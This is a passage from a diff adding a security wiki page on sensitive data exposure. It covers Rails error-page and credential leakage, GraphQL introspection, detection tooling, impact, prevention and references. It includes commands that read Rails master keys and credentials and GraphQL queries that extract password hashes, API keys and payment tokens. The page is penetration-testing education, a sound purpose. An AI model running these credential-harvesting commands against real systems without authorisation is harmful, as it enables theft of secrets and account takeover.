+  <a class="anchor" href="#ruby-on-rails--full-error-pages--credential-leakage">#</a>
+</h3>
+<p>Rails in development/staging mode returns rich exception pages via the <code>web-console</code> and <code>better_errors</code> gems, which are occasionally left active in production.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># better_errors gem active in production → interactive REPL in the browser</span>
+</span></span><span style="display:flex;"><span>curl https://target.com/nonexistent-route
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Response: Full better_errors page with:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - Live Ruby REPL in browser</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - All local variables at crash point</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - Application environment (Rails.application.credentials)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Rails credentials file exposure (if master.key is committed to git)</span>
+</span></span><span style="display:flex;"><span>cat config/master.key   <span style="color:#75715e"># → decrypts config/credentials.yml.enc</span>
+</span></span><span style="display:flex;"><span>rails credentials:show  <span style="color:#75715e"># → reveals all secrets in plaintext</span>
+</span></span></code></pre></div><h3 id="graphql--introspection--over-fetching">
+  GraphQL — Introspection &amp; Over-fetching
+  <a class="anchor" href="#graphql--introspection--over-fetching">#</a>
+</h3>
+<p>GraphQL&rsquo;s introspection system, when left enabled in production, fully documents every type, field, query, and mutation — including sensitive internal fields never exposed in the UI.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Full schema extraction via introspection</span>
+</span></span><span style="display:flex;"><span>curl -X POST https://target.com/graphql <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{&#34;query&#34;: &#34;{ __schema { types { name fields { name type { name } } } } }&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Then query exposed sensitive fields directly</span>
+</span></span><span style="display:flex;"><span>curl -X POST https://target.com/graphql <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{&#34;query&#34;: &#34;{ user(id: 1) { id email passwordHash apiKey internalNotes stripeToken } }&#34;}&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Automated GraphQL secret field discovery</span>
+</span></span><span style="display:flex;"><span>graphql-cop -t https://target.com/graphql
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Checks for: introspection enabled, field suggestions, batching attacks, sensitive field names</span>
+</span></span></code></pre></div><h2 id="detection-techniques">
+  Detection Techniques
+  <a class="anchor" href="#detection-techniques">#</a>
+</h2>
+<h3 id="manual-detection">
+  Manual Detection
+  <a class="anchor" href="#manual-detection">#</a>
+</h3>
+<ul>
+<li><strong>Response Body Auditing:</strong> Intercept all API responses in Burp Suite and inspect for fields that shouldn&rsquo;t be client-visible: hashes, tokens, internal IDs, connection strings.</li>
+<li><strong>JS Bundle Inspection:</strong> Download all <code>.js</code> assets and search for secret patterns using <code>grep</code>; use <code>source-map-explorer</code> if source maps are present.</li>
+<li><strong>Header Enumeration:</strong> Review every response header for <code>Server</code>, <code>X-Powered-By</code>, <code>Via</code>, <code>X-Backend-Server</code>, and missing security headers (<code>X-Content-Type-Options</code>, <code>Referrer-Policy</code>).</li>
+<li><strong>Backup &amp; Artifact Discovery:</strong> Manually probe for <code>.env</code>, <code>.git/</code>, <code>config.php.bak</code>, <code>dump.sql</code>, <code>swagger.json</code>, <code>sitemap.xml</code>, <code>.DS_Store</code>, <code>.htpasswd</code>.</li>
+<li><strong>Error Triggering:</strong> Send malformed inputs (wrong types, SQL metacharacters, oversized values, null bytes) to every endpoint and inspect error responses for stack traces.</li>
+<li><strong>Cloud Bucket Testing:</strong> Attempt unauthenticated <code>LIST</code> and <code>GET</code> operations against guessed or discovered bucket names.</li>
+</ul>
+<h3 id="automated-detection">
+  Automated Detection
+  <a class="anchor" href="#automated-detection">#</a>
+</h3>
+<ul>
+<li>
+<p><strong>TruffleHog:</strong> Scans git history, filesystems, and S3 buckets for verified secrets using entropy analysis and regex patterns.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>trufflehog git https://github.com/target/repo --only-verifiedtrufflehog s3 --bucket<span style="color:#f92672">=</span>target-company-backups
+</span></span></code></pre></div></li>
+<li>
+<p><strong>Gitleaks:</strong> Fast git repository secret scanner; integrates into CI/CD pipelines as a pre-commit hook.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gitleaks detect --source . --report-format json --report-path leaks.json
+</span></span></code></pre></div></li>
+<li>
+<p><strong>Nuclei (Exposure Templates):</strong> Thousands of community templates detecting exposed <code>.env</code>, debug endpoints, backup files, cloud metadata, and framework-specific leaks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nuclei -u https://target.com -t exposures/ -t misconfiguration/ -severity critical,high
+</span></span></code></pre></div></li>
+<li>
+<p><strong>CloudSploit / Prowler:</strong> Cloud-native misconfiguration scanners checking S3 ACLs, IAM policies, public RDS snapshots, and exposed storage across AWS/GCP/Azure.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prowler aws --checks s3_bucket_public_access --output-formats json
+</span></span></code></pre></div></li>
+<li>
+<p><strong>Burp Suite Pro — Passive Scanner:</strong> Automatically flags sensitive data patterns (credit card numbers, AWS keys, JWT tokens) appearing in response bodies and headers during manual browsing.</p>
+</li>
+<li>
+<p><strong>GitDorker / GitHub Dorks:</strong> Searches GitHub for accidentally committed secrets in public repositories belonging to the target organization.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 gitdorker.py -tf tokens.txt -q <span style="color:#e6db74">&#34;org:target-company&#34;</span> -d dorks/secrets.txt
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="impact">
+  Impact
+  <a class="anchor" href="#impact">#</a>
+</h2>
+<ul>
+<li><strong>Account Takeover at Scale:</strong> Leaked password hashes cracked offline enable mass credential-stuffing campaigns against the target and third-party services (password reuse).</li>
+<li><strong>Full Infrastructure Compromise:</strong> Exposed AWS/GCP keys with production IAM permissions grant attackers access to databases, object storage, compute instances, and billing controls.</li>
+<li><strong>Regulatory Penalties:</strong> PCI-DSS, GDPR, HIPAA, and SOC 2 mandate protection of cardholder data, PII, and PHI — a single confirmed breach triggers mandatory disclosure and potential multi-million dollar fines.</li>
+<li><strong>Intellectual Property Theft:</strong> Source code reconstruction from <code>.map</code> files or <code>.git</code> exposure reveals proprietary business logic, internal API structure, and unreleased features.</li>
+<li><strong>Supply Chain Attacks:</strong> Leaked CI/CD tokens or NPM/PyPI credentials allow attackers to inject malicious code into package releases affecting all downstream consumers.</li>
+<li><strong>Silent Long-Term Surveillance:</strong> Unlike active attacks, data exposure is often silent — attackers silently exfiltrate data over months before detection.</li>
+<li><strong>Identity Fraud:</strong> PII exposure (SSNs, passport numbers, DOBs) enables downstream identity theft, loan fraud, and social engineering attacks against victims.</li>
+</ul>
+<h2 id="prevention-techniques">
+  Prevention Techniques
+  <a class="anchor" href="#prevention-techniques">#</a>
+</h2>
+<ul>
+<li><strong>Classify Data Before Building:</strong> Maintain a data inventory. Every sensitive field must have a documented storage format (encrypted, hashed, tokenized) and access policy before development begins.</li>
+<li><strong>Never Return What You Don&rsquo;t Need:</strong> API responses should be built from explicit allow-lists of fields, never serialized directly from ORM models. Apply the principle of minimal disclosure.</li>
+<li><strong>Use Strong, Salted Hashing for Passwords:</strong> Use <code>bcrypt</code> (cost ≥ 12), <code>Argon2id</code>, or <code>scrypt</code> exclusively. Never use MD5, SHA-1, SHA-256, or unsalted hashes for passwords.</li>
+<li><strong>Encrypt Sensitive Fields at Rest:</strong> Use AES-256-GCM for field-level encryption of PII, financial data, and secrets stored in databases. Manage keys separately from data (AWS KMS, HashiCorp Vault).</li>
+<li><strong>Secrets Management — Never Hardcode:</strong> All credentials, API keys, and tokens must be injected at runtime via a secrets manager (Vault, AWS Secrets Manager, GCP Secret Manager) — never in source code, <code>.env</code> files committed to git, or environment variable dumps.</li>
+<li><strong>Disable Debug Modes in Production:</strong> Enforce <code>DEBUG=False</code> (Django), <code>config.debug = false</code> (Express), <code>RAILS_ENV=production</code> — validated via automated CI/CD checks.</li>
+<li><strong>Restrict Cloud Storage ACLs:</strong> All S3/GCS/Azure buckets must default to private. Enable Block Public Access settings at the account level and enforce via SCP/Organization Policy.</li>
+<li><strong>Disable GraphQL Introspection in Production:</strong> Set <code>introspection: false</code> and implement field-level authorization on every resolver — not just at the query entry point.</li>
+<li><strong>Set Secure Cookie Flags:</strong> All session cookies must have <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite=Strict</code> or <code>SameSite=Lax</code> flags set unconditionally.</li>
+<li><strong>Remove Source Maps from Production Builds:</strong> Configure webpack/Vite/Rollup to suppress <code>.map</code> file generation in production builds; if needed for internal debugging, serve them behind authentication.</li>
+<li><strong>Implement Security Headers:</strong> Deploy <code>Referrer-Policy: no-referrer</code>, <code>X-Content-Type-Options: nosniff</code>, <code>Cache-Control: no-store</code> on all sensitive API responses, <code>Permissions-Policy</code>, and <code>Content-Security-Policy</code>.</li>
+<li><strong>Rotate Exposed Secrets Immediately:</strong> Treat any credential found in a scan or report as fully compromised — rotate it immediately, audit access logs for prior use, and investigate the exposure window.</li>
+</ul>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+<th>Link</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>TruffleHog</code></td>
+<td>Secret scanning in git, S3, filesystems</td>
+<td><a href="https://github.com/trufflesecurity/trufflehog" target="_blank" rel="noreferrer noopener nofollow">https://github.com/trufflesecurity/trufflehog</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+</tr>
+<tr>
+<td><code>Gitleaks</code></td>
+<td>Fast git secret scanner, CI/CD integration</td>
+<td><a href="https://github.com/gitleaks/gitleaks" target="_blank" rel="noreferrer noopener nofollow">https://github.com/gitleaks/gitleaks</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+</tr>
+<tr>
+<td><code>Nuclei</code></td>
+<td>Template-based exposure &amp; misconfiguration scanning</td>
+<td><a href="https://github.com/projectdiscovery/nuclei" target="_blank" rel="noreferrer noopener nofollow">https://github.com/projectdiscovery/nuclei</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+</tr>
+<tr>
+<td><code>Prowler</code></td>
+<td>AWS/GCP/Azure cloud misconfiguration auditor</td>
+<td><a href="https://github.com/prowler-cloud/prowler" target="_blank" rel="noreferrer noopener nofollow">https://github.com/prowler-cloud/prowler</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+</tr>
+<tr>
+<td><code>CloudSploit</code></td>
+<td>Cloud security scanning across providers</td>
+<td><a href="https://github.com/aquasecurity/cloudsploit" target="_blank" rel="noreferrer noopener nofollow">https://github.com/aquasecurity/cloudsploit</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+</tr>
+<tr>
+<td><code>GraphQL Cop</code></td>
+<td>GraphQL security misconfiguration tester</td>
+<td><a href="https://github.com/dolevf/graphql-cop" target="_blank" rel="noreferrer noopener nofollow">https://github.com/dolevf/graphql-cop</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+</tr>
+<tr>
+<td><code>git-dumper</code></td>
+<td>Reconstruct git repos from exposed <code>.git/</code></td>
+<td><a href="https://github.com/arthaud/git-dumper" target="_blank" rel="noreferrer noopener nofollow">https://github.com/arthaud/git-dumper</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+</tr>
+<tr>
+<td><code>source-map-explorer</code></td>
+<td>Reconstruct source from JS source maps</td>
+<td><a href="https://github.com/danvk/source-map-explorer" target="_blank" rel="noreferrer noopener nofollow">https://github.com/danvk/source-map-explorer</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+</tr>
+<tr>
+<td><code>Burp Suite Pro</code></td>
+<td>HTTP interception, passive/active scanning</td>
+<td><a href="https://portswigger.net/burp" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/burp</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+</tr>
+<tr>
+<td><code>Hashcat</code></td>
+<td>GPU-accelerated hash cracking</td>
+<td><a href="https://hashcat.net" target="_blank" rel="noreferrer noopener nofollow">https://hashcat.net</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+</tr>
+<tr>
+<td><code>hash-identifier</code></td>
+<td>Identify hash algorithm from sample</td>
+<td><a href="https://github.com/blackploit/hash-identifier" target="_blank" rel="noreferrer noopener nofollow">https://github.com/blackploit/hash-identifier</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+</tr>
+<tr>
+<td><code>GitDorker</code></td>
+<td>GitHub dork-based secret discovery</td>
+<td><a href="https://github.com/obheda12/GitDorker" target="_blank" rel="noreferrer noopener nofollow">https://github.com/obheda12/GitDorker</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+</tr>
+<tr>
+<td><code>ffuf</code></td>
+<td>Fast fuzzing for backup files and hidden endpoints</td>
+<td><a href="https://github.com/ffuf/ffuf" target="_blank" rel="noreferrer noopener nofollow">https://github.com/ffuf/ffuf</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+</tr>
+<tr>
+<td><code>AWS CLI</code></td>
+<td>Direct cloud storage enumeration</td>
+<td><a href="https://aws.amazon.com/cli/" target="_blank" rel="noreferrer noopener nofollow">https://aws.amazon.com/cli/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+</tr>
+</tbody>
+</table>
+<h2 id="good-to-read">
+  Good To Read
+  <a class="anchor" href="#good-to-read">#</a>
+</h2>
+<h3 id="hackerone-reports">
+  HackerOne Reports
+  <a class="anchor" href="#hackerone-reports">#</a>
+</h3>
+<ul>
+<li><a href="https://hackerone.com/reports/1278977" target="_blank" rel="noreferrer noopener nofollow"><strong>Sensitive Data Exposure - US DoD</strong></a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/1087489" target="_blank" rel="noreferrer noopener nofollow"><strong>Shopify (#1087489):</strong> Github access token exposure.</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/145150" target="_blank" rel="noreferrer noopener nofollow"><strong>Bulk UUID enumeration via invite codes</strong></a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/423506" target="_blank" rel="noreferrer noopener nofollow"><strong>H1514 Extract information about other sites (new sites) through Affiliate/Referral pages</strong></a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+<h3 id="writeups">
+  Writeups
+  <a class="anchor" href="#writeups">#</a>
+</h3>
+<ul>
+<li><a href="https://www.uber.com/newsroom/security-update" target="_blank" rel="noreferrer noopener nofollow">The Full Uber Hack Writeup — Credential Exposure Chain (2022)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://detectify.com/" target="_blank" rel="noreferrer noopener nofollow">Detectify Blog — How we found AWS Keys on GitHub for fun and profit</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://www.gitguardian.com/state-of-secrets-sprawl" target="_blank" rel="noreferrer noopener nofollow">GitGuardian State of Secrets Sprawl Annual Report</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li><a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" target="_blank" rel="noreferrer noopener nofollow">OWASP Top 10: A02:2021 — Cryptographic Failures</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/" target="_blank" rel="noreferrer noopener nofollow">OWASP API Security Top 10: API3:2023 — Broken Object Property Level Authorization</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noreferrer noopener nofollow">OWASP Testing Guide: WSTG-CRYP-04 — Testing for Weak Encryption</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html" target="_blank" rel="noreferrer noopener nofollow">OWASP Cryptographic Storage Cheat Sheet</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final" target="_blank" rel="noreferrer noopener nofollow">NIST SP 800-57 — Key Management Guidelines</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://cwe.mitre.org/data/definitions/200.html" target="_blank" rel="noreferrer noopener nofollow">CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://cwe.mitre.org/data/definitions/312.html" target="_blank" rel="noreferrer noopener nofollow">CWE-312: Cleartext Storage of Sensitive Information</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://cwe.mitre.org/data/definitions/916.html" target="_blank" rel="noreferrer noopener nofollow">CWE-916: Use of Password Hash With Insufficient Computational Effort</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html" target="_blank" rel="noreferrer noopener nofollow">AWS S3 Block Public Access Documentation</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://portswigger.net/web-security/information-disclosure" target="_blank" rel="noreferrer noopener nofollow">PortSwigger: Information Disclosure Vulnerabilities</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://haveibeenpwned.com/" target="_blank" rel="noreferrer noopener nofollow">HaveIBeenPwned: Understanding Credential Exposure at Scale</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 5, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Sensitive%20Data%20Exposure.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#sensitive-data-exposure">Sensitive Data Exposure</a>
+      <ul>
+        <li><a href="#understanding-sensitive-data-exposure-basics">Understanding Sensitive Data Exposure Basics</a>
+          <ul>
+            <li><a href="#the-exposure-triangle">The Exposure Triangle</a></li>
+            <li><a href="#common-data-types-targeted">Common Data Types Targeted</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surface">Attack Surface</a>
+          <ul>
+            <li><a href="#api--endpoint-leakage">API &amp; Endpoint Leakage</a></li>
+            <li><a href="#cloud-misconfigurations">Cloud Misconfigurations</a></li>
+            <li><a href="#cryptographic-failures">Cryptographic Failures</a></li>
+            <li><a href="#client-side-exposure">Client-Side Exposure</a></li>
+          </ul>
+        </li>
+        <li><a href="#exploiting-sensitive-data-exposure">Exploiting Sensitive Data Exposure</a>
+          <ul>
+            <li><a href="#1-api-over-fetching--mass-object-exposure">1. API Over-Fetching / Mass Object Exposure</a></li>
+            <li><a href="#2-verbose-error-messages--stack-trace--path-disclosure">2. Verbose Error Messages — Stack Trace / Path Disclosure</a></li>
+            <li><a href="#3-cloud-metadata-ssrf--credential-harvesting">3. Cloud Metadata SSRF — Credential Harvesting</a></li>
+            <li><a href="#4-public-cloud-storage-enumeration">4. Public Cloud Storage Enumeration</a></li>
+            <li><a href="#5-javascript-bundle-mining">5. JavaScript Bundle Mining</a></li>
+            <li><a href="#6-cryptographic-failure-weak-hash-cracking">6. Cryptographic Failure: Weak Hash Cracking</a></li>
+            <li><a href="#7-git-repository--backup-file-exposure">7. Git Repository &amp; Backup File Exposure</a></li>
+            <li><a href="#8-http-response-header-leakage">8. HTTP Response Header Leakage</a></li>
+          </ul>
+        </li>
+        <li><a href="#bypasses--obfuscation">Bypasses &amp; Obfuscation</a>
+          <ul>
+            <li><a href="#1-accessing-hidden-api-fields-via-parameter-manipulation">1. Accessing Hidden API Fields via Parameter Manipulation</a></li>
+            <li><a href="#2-older-api-version-regression">2. Older API Version Regression</a></li>
+            <li><a href="#3-forced-error-state-triggering">3. Forced Error State Triggering</a></li>
+            <li><a href="#4-cache--cdn-poisoning-to-surface-private-responses">4. Cache / CDN Poisoning to Surface Private Responses</a></li>
+          </ul>
+        </li>
+        <li><a href="#test-cases">Test Cases</a></li>
+        <li><a href="#framework-specific-scenarios">Framework-Specific Scenarios</a>
+          <ul>
+            <li><a href="#spring-boot-java--actuator-exposure">Spring Boot (Java) — Actuator Exposure</a></li>
+            <li><a href="#django-python--debug-mode--secret-key-exposure">Django (Python) — Debug Mode &amp; Secret Key Exposure</a></li>
+            <li><a href="#laravel-php--env-file--debug-bar-exposure">Laravel (PHP) — .env File &amp; Debug Bar Exposure</a></li>
+            <li><a href="#expressjs--nodejs--environment-variable-leakage">Express.js / Node.js — Environment Variable Leakage</a></li>
+            <li><a href="#ruby-on-rails--full-error-pages--credential-leakage">Ruby on Rails — Full Error Pages &amp; Credential Leakage</a></li>
+            <li><a href="#graphql--introspection--over-fetching">GraphQL — Introspection &amp; Over-fetching</a></li>
+          </ul>
+        </li>
+        <li><a href="#detection-techniques">Detection Techniques</a>
+          <ul>
+            <li><a href="#manual-detection">Manual Detection</a></li>
+            <li><a href="#automated-detection">Automated Detection</a></li>
+          </ul>
+        </li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#prevention-techniques">Prevention Techniques</a></li>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#good-to-read">Good To Read</a>
+          <ul>
+            <li><a href="#hackerone-reports">HackerOne Reports</a></li>
+            <li><a href="#writeups">Writeups</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
